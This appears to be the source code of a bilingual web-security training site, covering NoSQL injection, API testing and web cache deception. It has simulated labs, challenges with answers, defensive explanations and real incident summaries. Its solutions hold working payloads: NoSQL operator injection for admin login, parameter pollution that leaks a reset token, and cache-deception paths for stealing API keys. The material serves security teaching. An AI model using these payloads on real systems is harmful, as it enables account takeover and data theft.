          { label: '^admin', values: { b: '{"username":{"$regex":"^admin"},"password":{"$ne":""}}' } },
        ],
        defense: STRICT,
        run({ values, defended }) {
          const r = mongoLogin(values.b, { strict: defended });
          if (r.err) return { request: `POST /login\n\n${values.b}`, log: [], response: r.err, ...(r.blocked ? verdict(false, 'Only strings are accepted.', '只接受字符串。') : neutral('Bad JSON.', 'JSON 格式错误。')) };
          return { request: `POST /login\n\n${values.b}`, log: [r.query], response: r.user ? `HTTP/1.1 302 → /my-account?id=${r.user.username}` : 'HTTP/1.1 200 "Invalid username or password"', ...(r.user?.role === 'admin' ? verdict(true, `First matching admin: ${r.user.username}.`, `第一个匹配的管理员：${r.user.username}。`) : neutral('No match.', '没有匹配。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Log in as administrator', '以 administrator 登录'),
      goal: L('The login endpoint accepts JSON and passes it to db.users.findOne(). Log in as administrator without knowing the password.', '登录接口接受 JSON，并把它传给 db.users.findOne()。不知道密码，以 administrator 身份登录。'),
      fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), rows: 2, default: '{"username":"administrator","password":"guess"}' }],
      run({ b }) {
        const r = mongoLogin(b);
        return r.err ? { log: [], response: r.err } : { log: [r.query], response: r.user ? `HTTP/1.1 302 → /my-account?id=${r.user.username}` : 'HTTP/1.1 200 "Invalid username or password"', who: r.user?.username };
      },
      check: (v, o) => o.who === 'administrator',
      hint: L('Replace the password string with an operator object that is true for any password.', '把密码字符串换成一个对任何密码都成立的操作符对象。'),
      solution: '{"username":"administrator","password":{"$ne":""}}',
      explain: L('The query expected a string but accepted an object, and objects carry operators. Validate types (or cast to string) before building queries.', '查询期待的是字符串，却接受了对象，而对象里可以带操作符。在构造查询之前校验类型（或强制转换为字符串）。'),
    },
    {
      title: L('The admin with a random name', '名字随机的管理员'),
      goal: L('There is a second admin whose username is “admin” followed by four random characters. Log in as that account.', '还有一个管理员，用户名是“admin”加四个随机字符。以这个账号登录。'),
      fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), rows: 2, default: '{"username":"admin","password":{"$ne":""}}' }],
      run({ b }) {
        const r = mongoLogin(b);
        return r.err ? { log: [], response: r.err } : { log: [r.query], response: r.user ? `HTTP/1.1 302 → /my-account?id=${r.user.username}` : 'HTTP/1.1 200 "Invalid username or password"', who: r.user?.username };
      },
      check: (v, o) => o.who === 'admin7f2c',
      hint: L('$regex can match a prefix. Make sure “administrator” doesn’t match first.', '$regex 可以匹配前缀。注意别让“administrator”先被匹配到。'),
      solution: '{"username":{"$regex":"^admin.{4}$"},"password":{"$ne":""}}',
      explain: L('Operator injection gives the attacker a query language, not just a value. A schema that only allows strings closes it completely.', '操作符注入交给攻击者的是一门查询语言，而不只是一个值。只允许字符串的 schema 能彻底堵住它。'),
    },
  ],
  cases: [
    { year: '2021', ref: 'CVE-2021-22911', title: L('Rocket.Chat account takeover', 'Rocket.Chat 账号接管'), what: L('A NoSQL injection in Rocket.Chat’s password-reset related methods let unauthenticated attackers extract data such as reset tokens, take over accounts, and (with an admin account) reach remote code execution on the server.', 'Rocket.Chat 与密码重置相关的方法中存在 NoSQL 注入，未经认证的攻击者可以提取重置令牌等数据、接管账号，并（借助管理员账号）在服务器上实现远程代码执行。'), lesson: L('“No SQL” does not mean “no injection”. Type-check every input that reaches a query.', '“没有 SQL”不等于“没有注入”。对每个进入查询的输入做类型检查。') },
  ],
};

/* ====================================================== API testing */
const API_USERS = { wiener: { email: 'wiener@shop.example' }, carlos: { email: 'carlos@shop.example' }, administrator: { email: 'admin@shop.example' } };
const RESET_TOKEN = 'p0Lt3dA9xQ';
function internalSearch(qs) {
  const p = new URLSearchParams(qs);
  const name = p.get('name');
  const field = p.get('field') || 'email';
  if (!API_USERS[name]) return { status: 404, body: '{"error":"user not found"}' };
  if (field === 'reset_token') return { status: 200, body: `{"type":"reset_token","result":"${name === 'administrator' ? RESET_TOKEN : 'c2t8…'}"}`, leak: name === 'administrator' };
  if (field === 'email') return { status: 200, body: `{"type":"email","result":"${API_USERS[name].email.replace(/^(.).*@/, '$1*****@')}"}` };
  return { status: 400, body: `{"error":"Invalid field"}` };
}

const api = {
  variants: [
    {
      id: 'docs',
      title: L('Exposed documentation', '暴露的接口文档'),
      summary: L('Try /api, /swagger, /openapi.json. Documentation lists endpoints the UI never calls.', '试试 /api、/swagger、/openapi.json。文档会列出界面从不调用的接口。'),
      lab: {
        fields: [{ id: 'p', label: L('Path', '路径'), default: '/api' }],
        presets: [
          { label: '/api/user/wiener', values: { p: '/api/user/wiener' } },
          { label: '/api', values: { p: '/api' } },
        ],
        defense: { label: L('Docs', '文档'), off: L('Public', '公开'), on: L('Auth required', '需要认证') },
        run({ values, defended }) {
          const p = values.p.trim().replace(/\/$/, '');
          if (p === '/api') return defended ? { request: `GET ${p}`, log: [], response: 'HTTP/1.1 401', ...verdict(false, 'Docs only for authenticated staff.', '文档只对已认证的员工开放。') } : { request: `GET ${p}`, log: [], response: 'HTTP/1.1 200 OK\n\nGET    /api/user/{username}\nPATCH  /api/user/{username}\nDELETE /api/user/{username}', ...verdict(true, 'A DELETE endpoint the UI never mentions.', '一个界面从未提及的 DELETE 接口。') };
          return { request: `GET ${p}`, log: [], response: p === '/api/user/wiener' ? '{"username":"wiener","email":"wiener@shop.example"}' : 'HTTP/1.1 404', ...neutral('Walk up the path.', '顺着路径往上走。') };
        },
      },
    },
    {
      id: 'methods',
      title: L('Unexpected HTTP methods', '意料之外的 HTTP 方法'),
      summary: L('The UI only GETs /api/products/1/price, but the server also accepts PATCH, and only checked authorisation for the methods the UI uses.', '界面只会 GET /api/products/1/price，但服务器也接受 PATCH，而且只对界面使用的方法做了授权检查。'),
      lab: {
        fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 4, default: 'PATCH /api/products/1/price HTTP/1.1\nContent-Type: application/json\n\n{"price":0}' }],
        presets: [
          { label: 'GET', values: { r: 'GET /api/products/1/price HTTP/1.1' } },
          { label: 'OPTIONS', values: { r: 'OPTIONS /api/products/1/price HTTP/1.1' } },
          { label: 'PATCH', values: { r: 'PATCH /api/products/1/price HTTP/1.1\nContent-Type: application/json\n\n{"price":0}' } },
        ],
        defense: { label: L('Authorisation', '授权'), off: L('Per UI action', '按界面操作'), on: L('Per method + role', '按方法 + 角色') },
        run({ values, defended }) {
          const q = parseReq(values.r);
          if (q.method === 'GET') return { request: values.r, log: [], response: '{"price":"$1337.00"}', ...neutral('Read-only, as expected.', '只读，符合预期。') };
          if (q.method === 'OPTIONS') return { request: values.r, log: [], response: 'HTTP/1.1 204\nAllow: GET, PATCH', ...neutral('PATCH is allowed. Interesting.', '允许 PATCH。有意思。') };
          if (q.method !== 'PATCH') return { request: values.r, log: [], response: 'HTTP/1.1 405', ...neutral('Not allowed.', '不允许。') };
          if (defended) return { request: values.r, log: [L('🛡 PATCH requires role admin', '🛡 PATCH 需要 admin 角色')], response: 'HTTP/1.1 403', ...verdict(false, 'Every method is authorised on its own.', '每种方法都单独授权。') };
          const price = q.json?.price;
          return { request: values.r, log: [], response: typeof price === 'number' ? `{"price":"$${(price / 100).toFixed(2)}"}` : 'HTTP/1.1 400 "price must be a number"', ...(typeof price === 'number' && price < 133700 ? verdict(true, 'A customer just changed the product’s price.', '一位顾客刚刚修改了商品价格。') : neutral('Send a JSON body with a price.', '发送一个带 price 的 JSON 请求体。')) };
        },
      },
    },
    {
      id: 'pollution',
      title: L('Server-side parameter pollution', '服务端参数污染'),
      summary: L('The public endpoint passes your value into a query string for an internal API. An encoded & adds parameters; an encoded # cuts the rest off.', '公开接口把你的值放进调用内部 API 的查询字符串里。编码后的 & 能加参数，编码后的 # 能截断剩下的部分。'),
      lab: {
        fields: [{ id: 'u', label: L('username (form body, URL-encoded)', 'username（表单请求体，URL 编码）'), default: 'administrator%26field=reset_token%23' }],
        presets: [
          { label: 'administrator', values: { u: 'administrator' } },
          { label: '%26x=y', values: { u: 'administrator%26x=y' } },
          { label: '%26field=email%23', values: { u: 'administrator%26field=email%23' } },
          { label: '%26field=reset_token%23', values: { u: 'administrator%26field=reset_token%23' } },
        ],
        defense: { label: L('Internal call', '内部调用'), off: L('String concatenation', '字符串拼接'), on: L('Encode each parameter', '对每个参数编码') },
        run({ values, defended }) {
          const val = decodeOnce(values.u);
          const qs = defended ? `name=${encodeURIComponent(val)}&publicProfile=true` : `name=${val}&publicProfile=true`;
          const cut = qs.split('#')[0];
          const r = internalSearch(cut);
          return { request: `POST /forgot-password\n\nusername=${values.u}`, log: [`GET /internal/users/search?${qs}`, cut !== qs ? L('# truncates the rest', '# 截断了剩余部分') : ''].filter(Boolean), response: r.body, ...(r.leak ? verdict(true, 'The internal API returned the admin’s reset token.', '内部 API 返回了管理员的重置令牌。') : defended ? verdict(false, 'Your & and # stay inside the name value.', '你的 & 和 # 只留在 name 的值里。') : neutral('Keep probing the internal parameters.', '继续探测内部参数。')) };
        },
      },
    },
    {
      id: 'exposure',
      title: L('Excessive data exposure', '过度的数据暴露'),
      summary: L('The API returns the whole database object and relies on the front-end to hide fields. Look at the raw JSON.', 'API 返回整个数据库对象，依赖前端去隐藏字段。看看原始 JSON。'),
      lab: {
        fields: [{ id: 'p', label: L('Path', '路径'), default: '/api/products/1/reviews' }],
        presets: [{ label: 'reviews', values: { p: '/api/products/1/reviews' } }],
        defense: { label: L('Response', '响应'), off: L('Full object', '完整对象'), on: L('Response DTO', '响应 DTO') },
        run({ values, defended }) {
          const rev = defended ? { author: 'carlos', text: 'Great jacket!' } : { author: { username: 'carlos', email: 'carlos@shop.example', passwordHash: '$2b$10$Xk…', lastLoginIp: '198.51.100.23' }, text: 'Great jacket!' };
          return { request: `GET ${values.p}`, log: [L('UI shows: “carlos: Great jacket!”', '界面显示：“carlos: Great jacket!”')], response: JSON.stringify([rev], null, 2), ...(defended ? verdict(false, 'Only the fields the UI needs.', '只返回界面需要的字段。') : verdict(true, 'Email, hash and IP, hidden only by the UI.', '邮箱、哈希和 IP，只是被界面藏了起来。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Read the manual, delete carlos', '读文档，删 carlos'),
      goal: L('You are logged in as an ordinary user. Find the API documentation and delete the user carlos.', '你以普通用户身份登录。找到 API 文档并删除用户 carlos。'),
      fields: [{ id: 'r', label: L('Raw request', '原始请求'), rows: 2, default: 'GET /api/user/wiener HTTP/1.1' }],
      run({ r }) {
        const q = parseReq(r);
        const p = q.path.replace(/\/$/, '');
        if (q.method === 'GET' && p === '/api') return { log: [], response: 'GET    /api/user/{username}\nPATCH  /api/user/{username}\nDELETE /api/user/{username}' };
        const m = /^\/api\/user\/(\w+)$/.exec(p);
        if (!m || !API_USERS[m[1]]) return { log: [], response: 'HTTP/1.1 404' };
        if (q.method === 'DELETE') return { log: [L('no role check on DELETE', 'DELETE 没有角色检查')], response: `{"status":"deleted","username":"${m[1]}"}`, del: m[1] };
        return { log: [], response: JSON.stringify({ username: m[1], email: API_USERS[m[1]].email }) };
      },
      check: (v, o) => o.del === 'carlos',
      hint: L('Remove path segments from /api/user/wiener until something different comes back.', '从 /api/user/wiener 逐段删除路径，直到返回不一样的东西。'),
      solution: 'DELETE /api/user/carlos HTTP/1.1',
      explain: L('Undocumented is not unreachable. Inventory every endpoint and method, and authorise each one on the server.', '没写进文档不等于访问不到。清点每个接口和方法，并在服务端对每一个做授权。'),
    },
    {
      title: L('Pollute the internal query', '污染内部查询'),
      goal: L('POST /forgot-password sends username into GET /internal/users/search?name=USERNAME&publicProfile=true. Make it leak the administrator’s reset token and paste it below.', 'POST /forgot-password 会把 username 放进 GET /internal/users/search?name=USERNAME&publicProfile=true。让它泄露 administrator 的重置令牌，并粘贴到下方。'),
      fields: [
        { id: 'u', label: L('username (as sent, URL-encoded)', 'username（原样发送，URL 编码）'), default: 'administrator' },
        { id: 'a', label: L('Reset token', '重置令牌'), default: '' },
      ],
      run({ u, a }) {
        const qs = `name=${decodeOnce(u)}&publicProfile=true`;
        const r = internalSearch(qs.split('#')[0]);
        return { log: [`GET /internal/users/search?${qs}`, a ? (a.trim() === RESET_TOKEN ? L('✓ correct token', '✓ 令牌正确') : L('✗ wrong token', '✗ 令牌不对')) : ''].filter(Boolean), response: r.body };
      },
      check: (v) => v.a.trim() === RESET_TOKEN,
      hint: L('The response has a "type":"email" field. What other field might exist? Add &field=… with %26, and cut off publicProfile with %23.', '响应里有一个 "type":"email" 字段。还可能有什么其他字段？用 %26 加上 &field=…，再用 %23 截掉 publicProfile。'),
      solution: `administrator%26field=reset_token%23  →  ${RESET_TOKEN}`,
      explain: L('Building internal URLs by concatenation is injection, just into HTTP instead of SQL. Encode every parameter (or use a client library that does).', '用拼接方式构造内部 URL 也是注入，只不过注入的是 HTTP 而不是 SQL。对每个参数编码（或使用会自动编码的客户端库）。'),
    },
  ],
  cases: [
    { year: '2012', ref: L('GitHub / Ruby on Rails', 'GitHub / Ruby on Rails'), title: L('Mass assignment on GitHub', 'GitHub 上的批量赋值'), what: L('Egor Homakov used a mass-assignment weakness in a GitHub form to attach his public key to the Ruby on Rails organisation, then pushed a commit to the rails/rails repository to prove the point. It pushed Rails to make protected parameters the default.', 'Egor Homakov 利用 GitHub 某个表单的批量赋值缺陷，把自己的公钥加进了 Ruby on Rails 组织，随后向 rails/rails 仓库推送了一个提交来证明问题。这促使 Rails 把参数保护设为默认行为。'), lesson: L('APIs that bind request fields to objects need explicit allowlists.', '把请求字段绑定到对象的 API，需要显式的字段白名单。') },
    { year: '2023', ref: L('T-Mobile (US)', 'T-Mobile（美国）'), title: L('37 million accounts via one API', '一个 API 泄露 3700 万个账户'), what: L('T-Mobile disclosed that an attacker had abused one of its APIs since late 2022 to obtain data such as names, billing addresses, emails and phone numbers for about 37 million current customer accounts.', 'T-Mobile 披露，攻击者自 2022 年底起滥用其一个 API，获取了约 3700 万个现有客户账户的姓名、账单地址、邮箱和电话号码等数据。'), lesson: L('API inventory, rate limits and anomaly monitoring matter as much as the code.', 'API 清单、频率限制和异常监控与代码本身同样重要。') },
  ],
};

/* ====================================================== Web cache deception */
const KEY = 'carlos-API-7Hq2';
/** Cache: caches if path ends in a static extension, or starts with /resources/. Origin: decides what page to serve. */
function wcd(path, { origin = 'loose', cacheRule = 'ext', fixed = false }) {
  const log = [];
  const isStatic = cacheRule === 'ext' ? /\.(js|css|png|jpg|ico)$/i.test(path.split('?')[0]) : path.startsWith('/resources/');
  let originPath = path.split('?')[0];
  if (origin === 'loose') originPath = originPath.replace(/^\/my-account\/.*$/, '/my-account');
  if (origin === 'delimiter') originPath = originPath.split(';')[0];
  if (origin === 'normalise') {
    const segs = [];
    for (const s of decodeOnce(originPath).split('/')) {
      if (s === '..') segs.pop();
      else if (s && s !== '.') segs.push(s);
    }
    originPath = '/' + segs.join('/');
  }
  const page = originPath === '/my-account' ? `<h1>My account</h1>\nYour API key is: ${KEY}` : originPath.startsWith('/resources/') ? '(static file)' : null;
  log.push(L(`origin maps ${path} → ${originPath} ${page ? '(200)' : '(404)'}`, `源站把 ${path} 映射为 ${originPath} ${page ? '（200）' : '（404）'}`));
  const cached = isStatic && page && !fixed && page.includes('API key');
  log.push(cached ? L('cache: looks static → stored for 30s', '缓存：看起来是静态资源 → 存储 30 秒') : fixed && page?.includes('API key') ? L('🛡 origin sends Cache-Control: no-store', '🛡 源站返回 Cache-Control: no-store') : L('cache: not stored', '缓存：不存储'));
  return { page, cached, log };
}
function wcdRun(path, opts) {
  const r = wcd(path, opts);
  const atk = r.cached ? `HTTP/1.1 200 OK\nX-Cache: hit\n\n${r.page}` : 'HTTP/1.1 302 → /login\nX-Cache: miss';
  return { request: `1) carlos (logged in) visits ${path}\n2) you request ${path} with no cookies`, log: r.log, response: atk, stolen: r.cached };
}
const NOSTORE = { label: L('Origin', '源站'), off: L('No cache headers', '无缓存头'), on: 'Cache-Control: no-store' };

const cacheDeception = {
  variants: [
    {
      id: 'mapping',
      title: L('Path mapping discrepancy', '路径映射差异'),
      summary: L('The origin serves /my-account for /my-account/anything. The cache sees “.js” at the end and stores the victim’s page publicly.', '源站对 /my-account/anything 也返回 /my-account。缓存看到结尾是“.js”，就把受害者的页面公开存了起来。'),
      lab: {
        fields: [{ id: 'p', label: L('Link you send to carlos', '你发给 carlos 的链接'), default: '/my-account/x.js' }],
        presets: [
          { label: '/my-account', values: { p: '/my-account' } },
          { label: '/my-account/x.js', values: { p: '/my-account/x.js' } },
        ],
        defense: NOSTORE,
        run({ values, defended }) {
          const r = wcdRun(values.p, { origin: 'loose', cacheRule: 'ext', fixed: defended });
          return { request: r.request, log: r.log, response: r.response, ...(r.stolen ? verdict(true, 'You read carlos’s page from the cache.', '你从缓存里读到了 carlos 的页面。') : defended ? verdict(false, 'Private responses are never cached.', '私有响应永远不会被缓存。') : neutral('Nothing cached.', '没有被缓存。')) };
        },
      },
    },
    {
      id: 'delimiter',
      title: L('Delimiter discrepancy', '分隔符差异'),
      summary: L('Some frameworks treat ; as the end of the path (Java matrix parameters), but the cache doesn’t.', '有些框架把 ; 当作路径的结束（Java 矩阵参数），但缓存不这么认为。'),
      lab: {
        fields: [{ id: 'p', label: L('Link you send to carlos', '你发给 carlos 的链接'), default: '/my-account;x.js' }],
        presets: [
          { label: '/my-account/x.js', values: { p: '/my-account/x.js' } },
          { label: '/my-account;x.js', values: { p: '/my-account;x.js' } },
        ],
        defense: NOSTORE,
        run({ values, defended }) {
          const r = wcdRun(values.p, { origin: 'delimiter', cacheRule: 'ext', fixed: defended });
          return { request: r.request, log: r.log, response: r.response, ...(r.stolen ? verdict(true, 'Origin stopped at ;, cache saw .js.', '源站在 ; 处停止，缓存看到的是 .js。') : defended ? verdict(false, 'no-store wins.', 'no-store 生效了。') : neutral('Nothing cached.', '没有被缓存。')) };
        },
      },
    },
    {
      id: 'normalise',
      title: L('Normalisation discrepancy', '规范化差异'),
      summary: L('The cache stores anything under /resources/ without decoding. The origin decodes %2f and resolves ../, landing on /my-account.', '缓存会存储 /resources/ 下的一切，且不做解码。源站会解码 %2f 并解析 ../，最终落到 /my-account。'),
      lab: {
        fields: [{ id: 'p', label: L('Link you send to carlos', '你发给 carlos 的链接'), default: '/resources/..%2fmy-account' }],
        presets: [
          { label: '/resources/../my-account', values: { p: '/resources/../my-account' } },
          { label: '/resources/..%2fmy-account', values: { p: '/resources/..%2fmy-account' } },
        ],
        defense: NOSTORE,
        run({ values, defended }) {
          if (values.p.includes('/../')) return { request: `GET ${values.p}`, log: [L('browser normalises ../ before sending → /my-account', '浏览器在发送前就规范化了 ../ → /my-account')], response: 'HTTP/1.1 302 → /login\nX-Cache: miss', ...neutral('The browser resolved ../ itself. Encode the slash.', '浏览器自己解析了 ../。把斜杠编码。') };
          const r = wcdRun(values.p, { origin: 'normalise', cacheRule: 'prefix', fixed: defended });
          return { request: r.request, log: r.log, response: r.response, ...(r.stolen ? verdict(true, 'Cache and origin disagreed about which resource this is.', '缓存和源站对“这是哪个资源”产生了分歧。') : defended ? verdict(false, 'no-store wins.', 'no-store 生效了。') : neutral('Nothing cached.', '没有被缓存。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Steal the API key', '偷出 API 密钥'),
      goal: L('The cache stores any response whose path ends in .js, .css or an image extension. The origin is strict about paths but stops parsing at “;”. Craft the link that, once carlos visits it, lets you read his API key from the cache.', '缓存会存储路径以 .js、.css 或图片扩展名结尾的任何响应。源站对路径很严格，但解析到“;”就停止。构造一个链接，让 carlos 访问后，你能从缓存中读到他的 API 密钥。'),
      fields: [{ id: 'p', label: L('Link for carlos', '给 carlos 的链接'), default: '/my-account' }],
      run({ p }) {
        const r = wcdRun(p, { origin: 'delimiter', cacheRule: 'ext' });
        return { log: r.log, response: r.response, stolen: r.stolen };
      },
      check: (v, o) => o.stolen,
      hint: L('/my-account/x.js returns 404 here. Which character makes the origin ignore the rest?', '这里 /my-account/x.js 会返回 404。哪个字符能让源站忽略后面的部分？'),
      solution: '/my-account;x.js',
      explain: L('Two parsers, two answers to “what path is this?”. Mark private responses Cache-Control: no-store, and configure the cache to respect it.', '两个解析器，对“这是什么路径？”给出了两种答案。给私有响应加上 Cache-Control: no-store，并让缓存遵守它。'),
    },
    {
      title: L('Through the resources folder', '穿过资源目录'),
      goal: L('Now the cache stores everything under /resources/ and does not decode URLs. The origin decodes and resolves dot segments. Steal carlos’s API key.', '现在缓存会存储 /resources/ 下的一切，且不解码 URL。源站会解码并解析点号段。偷出 carlos 的 API 密钥。'),
      fields: [{ id: 'p', label: L('Link for carlos', '给 carlos 的链接'), default: '/resources/x.js' }],
      run({ p }) {
        if (p.includes('/../')) return { log: [L('browser normalises ../ first', '浏览器先规范化了 ../')], response: 'X-Cache: miss', stolen: false };
        const r = wcdRun(p, { origin: 'normalise', cacheRule: 'prefix' });
        return { log: r.log, response: r.response, stolen: r.stolen };
      },
      check: (v, o) => o.stolen,
      hint: L('Start with /resources/, then climb back up with an encoded slash.', '以 /resources/ 开头，再用编码后的斜杠爬回上层。'),
      solution: '/resources/..%2fmy-account',
      explain: L('The cache key and the origin’s routing must agree. Normalise consistently, and never cache authenticated responses by URL pattern alone.', '缓存键与源站路由必须一致。一致地做规范化，而且永远不要只按 URL 模式缓存需要认证的响应。'),
    },
  ],
  cases: [
    { year: '2017', ref: L('PayPal (Omer Gil)', 'PayPal（Omer Gil）'), title: L('The attack gets a name', '这种攻击有了名字'), what: L('Omer Gil published “Web Cache Deception” and showed it on PayPal: a URL like /myaccount/home/attack.css returned the account page, the CDN cached it as a stylesheet, and anyone could then load the victim’s details. PayPal fixed it through its bug bounty programme.', 'Omer Gil 发表了“Web 缓存欺骗”研究，并在 PayPal 上做了演示：像 /myaccount/home/attack.css 这样的 URL 会返回账户页面，CDN 把它当作样式表缓存下来，之后任何人都能加载受害者的信息。PayPal 通过漏洞赏金计划修复了它。'), lesson: L('CDN rules based on file extensions are dangerous when the origin ignores extra path segments.', '当源站会忽略多余的路径段时，基于文件扩展名的 CDN 规则就很危险。') },
    { year: '2023', ref: L('ChatGPT (Nagli)', 'ChatGPT（Nagli）'), title: L('Session data cached as CSS', '会话数据被当作 CSS 缓存'), what: L('Researcher Nagli reported that a path like /api/auth/session/x.css returned the user’s session information and was cached, which could have allowed account takeover via a crafted link. OpenAI fixed it within hours.', '研究员 Nagli 报告，像 /api/auth/session/x.css 这样的路径会返回用户的会话信息并被缓存，攻击者可能借助一个精心构造的链接接管账户。OpenAI 在数小时内修复了它。'), lesson: L('Even modern stacks get this wrong; always send no-store on authenticated API responses.', '即使是现代技术栈也会犯这个错；对需要认证的 API 响应始终返回 no-store。') },
  ],
};

export const SERVER2B = { race, xxe, nosqli, api, 'cache-deception': cacheDeception };
